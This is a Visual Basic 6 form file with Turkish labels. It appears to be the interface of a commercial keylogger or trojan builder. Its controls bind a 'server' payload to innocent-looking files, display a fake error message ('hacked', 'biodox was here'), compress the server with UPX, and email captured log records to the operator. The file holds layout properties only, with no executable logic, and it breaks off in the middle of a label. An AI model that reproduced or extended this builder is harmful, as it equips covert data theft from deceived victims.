VERSION 5.00
Begin VB.Form frm1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   4  'Fixed ToolWindow
   ClientHeight    =   7095
   ClientLeft      =   15
   ClientTop       =   15
   ClientWidth     =   6480
   ControlBox      =   0   'False
   Icon            =   "frm1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7095
   ScaleWidth      =   6480
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Index           =   8
      Left            =   8400
      TabIndex        =   42
      Text            =   "birleþtiriceðiniz dosya jpg,avi,gif,exe,bmp,com ..... olabilir"
      Top             =   6480
      Width           =   4695
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      Caption         =   "server'ý dosya ile birleþtir"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   1
      Left            =   7680
      MousePointer    =   99  'Custom
      TabIndex        =   41
      Top             =   6120
      Width           =   2175
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      Caption         =   "sahte hata mesajý görüntülensin"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   0
      Left            =   2280
      MousePointer    =   99  'Custom
      TabIndex        =   31
      Top             =   2400
      Width           =   3975
   End
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Index           =   5
      Left            =   3480
      TabIndex        =   30
      Text            =   "hacked"
      Top             =   2760
      Width           =   2175
   End
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Index           =   6
      Left            =   3480
      TabIndex        =   29
      Text            =   "biodox was here"
      Top             =   3120
      Width           =   2775
   End
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Index           =   1
      Left            =   2160
      TabIndex        =   20
      Text            =   "tikkysoft@gmail.com"
      Top             =   4560
      Width           =   4095
   End
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Index           =   2
      Left            =   2160
      TabIndex        =   19
      Text            =   "senin@msnadresin.com"
      Top             =   4920
      Width           =   4095
   End
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Index           =   3
      Left            =   2160
      TabIndex        =   18
      Text            =   "Log Kayitlarý"
      Top             =   5280
      Width           =   4095
   End
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Index           =   4
      Left            =   2160
      TabIndex        =   17
      Text            =   "50"
      Top             =   5640
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.CheckBox chc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      Caption         =   "server'ý upx v3.3 ile sýkýþtýr [ bu iþlem server boyutunu küçültür ]"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   2
      Left            =   120
      MousePointer    =   99  'Custom
      TabIndex        =   5
      Top             =   6240
      Width           =   6255
   End
   Begin VB.TextBox txt 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Trebuchet MS"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1335
      Index           =   0
      Left            =   1080
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   4
      Top             =   480
      Width           =   5175
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   0
      Left            =   240
      TabIndex        =   1
      Top             =   480
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "frm1.frx":628A
      PICN            =   "frm1.frx":65A4
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   1
      Left            =   240
      TabIndex        =   2
      Top             =   960
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "frm1.frx":6806
      PICN            =   "frm1.frx":6B20
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   2
      Left            =   240
      TabIndex        =   3
      Top             =   1440
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "frm1.frx":6D82
      PICN            =   "frm1.frx":709C
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   15
      Left            =   120
      TabIndex        =   6
      Top             =   6600
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   "  Kaydet   "
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "frm1.frx":72FE
      PICN            =   "frm1.frx":7618
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   16
      Left            =   1710
      TabIndex        =   7
      Top             =   6600
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   "  Satýn Al "
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":796A
      PICN            =   "frm1.frx":7C84
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   3
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   17
      Left            =   3315
      TabIndex        =   8
      Top             =   6600
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   " Hakkýnda "
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":7FD6
      PICN            =   "frm1.frx":82F0
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   3
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   18
      Left            =   4920
      TabIndex        =   9
      Top             =   6600
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   "   Çýkýþ     "
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":8642
      PICN            =   "frm1.frx":895C
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   3
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   300
      Index           =   19
      Left            =   6240
      TabIndex        =   10
      Top             =   0
      Width           =   255
      _ExtentX        =   450
      _ExtentY        =   529
      BTYPE           =   8
      TX              =   "X"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   0
      BCOLO           =   0
      FCOL            =   16777215
      FCOLO           =   16777215
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "frm1.frx":8CAE
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   3
      Left            =   240
      TabIndex        =   11
      Top             =   3720
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":8FC8
      PICN            =   "frm1.frx":92E2
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   4
      Left            =   840
      TabIndex        =   12
      Top             =   3720
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":9634
      PICN            =   "frm1.frx":994E
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   5
      Left            =   1440
      TabIndex        =   13
      Top             =   3720
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":9CA0
      PICN            =   "frm1.frx":9FBA
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   6
      Left            =   5760
      TabIndex        =   21
      Top             =   5640
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":A30C
      PICN            =   "frm1.frx":A626
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   3
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   7
      Left            =   4560
      TabIndex        =   22
      Top             =   5640
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":A978
      PICN            =   "frm1.frx":AC92
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   3
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   8
      Left            =   5160
      TabIndex        =   23
      Top             =   5640
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":AFE4
      PICN            =   "frm1.frx":B2FE
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   3
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   9
      Left            =   5760
      TabIndex        =   32
      Top             =   2640
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   0   'False
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":B650
      PICN            =   "frm1.frx":B96A
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   525
      Index           =   10
      Left            =   3480
      TabIndex        =   33
      Top             =   3600
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   926
      BTYPE           =   14
      TX              =   ""
      ENAB            =   0   'False
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":BCBC
      PICN            =   "frm1.frx":BFD6
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   525
      Index           =   11
      Left            =   4200
      TabIndex        =   34
      Top             =   3600
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   926
      BTYPE           =   14
      TX              =   ""
      ENAB            =   0   'False
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":C328
      PICN            =   "frm1.frx":C642
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   525
      Index           =   12
      Left            =   4920
      TabIndex        =   35
      Top             =   3600
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   926
      BTYPE           =   14
      TX              =   ""
      ENAB            =   0   'False
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":C994
      PICN            =   "frm1.frx":CCAE
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   525
      Index           =   13
      Left            =   5640
      TabIndex        =   36
      Top             =   3600
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   926
      BTYPE           =   14
      TX              =   ""
      ENAB            =   0   'False
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":D000
      PICN            =   "frm1.frx":D31A
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Project1.cmd cmd1 
      Height          =   375
      Index           =   14
      Left            =   13200
      TabIndex        =   43
      Top             =   6390
      Width           =   495
      _ExtentX        =   873
      _ExtentY        =   661
      BTYPE           =   14
      TX              =   ""
      ENAB            =   0   'False
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   16777215
      BCOLO           =   16777215
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   16777215
      MPTR            =   99
      MICON           =   "frm1.frx":D66C
      PICN            =   "frm1.frx":D986
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   " Dosya Ýle Birleþtir "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   13
      Left            =   7650
      TabIndex        =   45
      Top             =   5880
      Width           =   1335
   End
   Begin VB.Shape shp 
      Height          =   975
      Index           =   5
      Left            =   7560
      Top             =   5985
      Width           =   6255
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Dosya :"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   11
      Left            =   7680
      TabIndex        =   44
      Top             =   6510
      Width           =   555
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   " Sahte Hata Mesajý Ayarlarý "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   12
      Left            =   2250
      TabIndex        =   40
      Top             =   2055
      Width           =   1995
   End
   Begin VB.Shape shp 
      Height          =   2055
      Index           =   4
      Left            =   2160
      Top             =   2160
      Width           =   4215
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Mesaj Baþlýðý : "
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   6
      Left            =   2280
      TabIndex        =   39
      Top             =   2790
      Width           =   1050
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Mesaj Metni :"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   7
      Left            =   2280
      TabIndex        =   38
      Top             =   3150
      Width           =   960
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Mesaj Simgesi :"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   8
      Left            =   2280
      TabIndex        =   37
      Top             =   3480
      Width           =   1095
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   " Mail Ayarlarý "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   10
      Left            =   210
      TabIndex        =   28
      Top             =   4320
      Width           =   960
   End
   Begin VB.Shape shp 
      Height          =   1695
      Index           =   3
      Left            =   120
      Top             =   4425
      Width           =   6255
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Maili Gönderecek Adres : "
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Index           =   2
      Left            =   240
      TabIndex        =   27
      Top             =   4560
      Width           =   1815
   End
   Begin VB.Label lbl 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      Caption         =   "Maili Alacak Adres : "
